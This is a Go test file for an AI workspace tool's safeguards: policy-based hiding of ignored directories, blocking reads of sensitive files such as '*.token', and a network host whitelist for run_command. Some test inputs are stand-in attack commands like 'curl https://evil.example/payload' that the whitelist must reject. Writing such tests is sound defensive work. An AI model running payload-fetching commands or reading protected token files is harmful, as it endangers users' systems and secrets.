package main

import (
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/google/uuid"
)

func TestLoadAIWorkspaceProjectPolicyValidation(t *testing.T) {
	directory := t.TempDir()
	write := func(contents string) string {
		path := filepath.Join(directory, "ai-tool-policy.json")
		if err := os.WriteFile(path, []byte(contents), 0o600); err != nil {
			t.Fatal(err)
		}
		return path
	}
	valid, err := loadAIWorkspaceProjectPolicy(write(`{"ignoredDirectories":["vendor","Cache"],"sensitiveNames":["*.token","credential-*.json"]}`))
	if err != nil || len(valid.IgnoredDirectories) != 2 || valid.IgnoredDirectories[1] != "cache" ||
		len(valid.SensitiveNames) != 2 || valid.SensitiveNames[0] != "*.token" {
		t.Fatalf("valid policy = %+v error=%v", valid, err)
	}
	for _, contents := range []string{
		`not json`,
		`{"ignoredDirectories":["a/b"]}`,
		`{"sensitiveNames":["[broken"]}`,
		`{"ignoredDirectories":[""]}`,
	} {
		if _, err := loadAIWorkspaceProjectPolicy(write(contents)); err == nil {
			t.Fatalf("invalid policy accepted: %s", contents)
		}
	}
}

func TestAIWorkspaceProjectPolicyIgnoresAndProtects(t *testing.T) {
	fixture := newAIWorkspaceToolFixture(t, "readOnly")
	root := fixture.project.LocalPath
	if err := os.MkdirAll(filepath.Join(root, ".wenzwork"), 0o700); err != nil {
		t.Fatal(err)
	}
	policy := map[string]any{"ignoredDirectories": []string{"vendor"}, "sensitiveNames": []string{"*.token", "notes-private.txt"}}
	encoded, _ := json.Marshal(policy)
	if err := os.WriteFile(filepath.Join(root, ".wenzwork", "ai-tool-policy.json"), encoded, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(root, "vendor", "nested"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "vendor", "nested", "dep.txt"), []byte("needle\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "secret.token"), []byte("needle\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "notes-private.txt"), []byte("needle\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	search := fixture.executor.Execute(t.Context(), fixture.context, planAIWorkspaceTool(t, fixture, "search_files", map[string]any{
		"query": "needle", "max_results": float64(50),
	}), false)
	if search.IsError || strings.Contains(search.Content, "vendor") || strings.Contains(search.Content, "secret.token") ||
		strings.Contains(search.Content, "notes-private.txt") {
		t.Fatalf("policy-scoped search = %+v", search)
	}
	if _, err := fixture.executor.Plan(t.Context(), fixture.context, aiWorkspaceToolCall{
		ID: uuid.NewString(), Name: "read_file", Arguments: map[string]any{"path": "secret.token"},
	}); err != nil {
		t.Fatalf("plan should succeed; sensitivity is enforced at execution: %v", err)
	}
	sensitiveToken := fixture.executor.Execute(t.Context(), fixture.context, planAIWorkspaceTool(t, fixture, "read_file", map[string]any{"path": "secret.token"}), false)
	if !sensitiveToken.IsError || sensitiveToken.Metadata["error_code"] != "forbidden" {
		t.Fatalf("policy-sensitive read = %+v", sensitiveToken)
	}
	sensitive := fixture.executor.Execute(t.Context(), fixture.context, planAIWorkspaceTool(t, fixture, "read_file", map[string]any{"path": "notes-private.txt"}), false)
	if !sensitive.IsError || sensitive.Metadata["error_code"] != "forbidden" {
		t.Fatalf("policy-sensitive read = %+v", sensitive)
	}
	// Rewriting the policy file invalidates the stat cache.
	policy["sensitiveNames"] = []string{"*.token"}
	encoded, _ = json.Marshal(policy)
	if err := os.WriteFile(filepath.Join(root, ".wenzwork", "ai-tool-policy.json"), encoded, 0o600); err != nil {
		t.Fatal(err)
	}
	relaxed := fixture.executor.Execute(t.Context(), fixture.context, planAIWorkspaceTool(t, fixture, "read_file", map[string]any{"path": "notes-private.txt"}), false)
	if relaxed.IsError {
		t.Fatalf("cache did not refresh: %+v", relaxed)
	}
}

func TestAIWorkspaceCommandHostsAndWhitelist(t *testing.T) {
	hosts := aiWorkspaceCommandHosts("curl -sS https://github.com/wenzwork/repo.git && ssh git@github.com")
	if !slices.Contains(hosts, "github.com") || len(hosts) != 1 {
		t.Fatalf("hosts = %v", hosts)
	}
	if hosts := aiWorkspaceCommandHosts("go build ./cmd/v1.2.3"); len(hosts) != 0 {
		t.Fatalf("version tokens must be ignored: %v", hosts)
	}
	if !enforceAIWorkspaceNetworkHosts("curl https://github.com/x", []string{"github.com"}) {
		t.Fatal("whitelisted host must pass")
	}
	if enforceAIWorkspaceNetworkHosts("curl https://evil.example/x", []string{"github.com"}) {
		t.Fatal("off-whitelist host must fail")
	}
	if !enforceAIWorkspaceNetworkHosts("git clone https://github.com/a https://gitee.com/b", []string{"github.com", "gitee.com"}) {
		t.Fatal("multi-host whitelist must pass")
	}
}

func TestAIWorkspaceRunCommandEnforcesNetworkHostWhitelist(t *testing.T) {
	fixture := newAIWorkspaceToolFixture(t, aiWorkspaceModeWorkspaceWrite)
	fixture.executor.sandbox = func(request aiCommandSandboxRequest) (aiCommandSandboxLaunch, error) {
		return aiCommandSandboxLaunch{
			Argv: append([]string(nil), request.Argv...), WorkingDirectory: request.WorkingDirectory,
			SandboxMode: request.Mode, Status: "test workspace-write sandbox",
			NetworkAllowed: request.AllowNetwork, HardNetworkIsolation: !request.AllowNetwork,
		}, nil
	}
	allowed := planAIWorkspaceTool(t, fixture, "run_command", map[string]any{
		"command": "curl https://github.com/wenzwork", "allow_network": true, "network_hosts": []any{"github.com"},
	})
	if !allowed.commandLaunch.NetworkAllowed || !strings.Contains(allowed.Preview.Description, "白名单") {
		t.Fatalf("whitelisted plan = %+v", allowed)
	}
	if _, err := fixture.executor.Plan(t.Context(), fixture.context, aiWorkspaceToolCall{
		ID: uuid.NewString(), Name: "run_command", Arguments: map[string]any{
			"command": "curl https://evil.example/payload", "allow_network": true, "network_hosts": []any{"github.com"},
		},
	}); !errors.Is(err, errRPCForbidden) {
		t.Fatalf("off-whitelist command plan error = %v", err)
	}
	// Full access keeps the audit-only semantics.
	full := newAIWorkspaceToolFixture(t, aiWorkspaceModeFullAccess)
	full.executor.sandbox = fixture.executor.sandbox
	if _, err := full.executor.Plan(t.Context(), full.context, aiWorkspaceToolCall{
		ID: uuid.NewString(), Name: "run_command", Arguments: map[string]any{
			"command": "curl https://evil.example/payload", "allow_network": true, "network_hosts": []any{"github.com"},
		},
	}); err != nil {
		t.Fatalf("full access plan error = %v", err)
	}
}
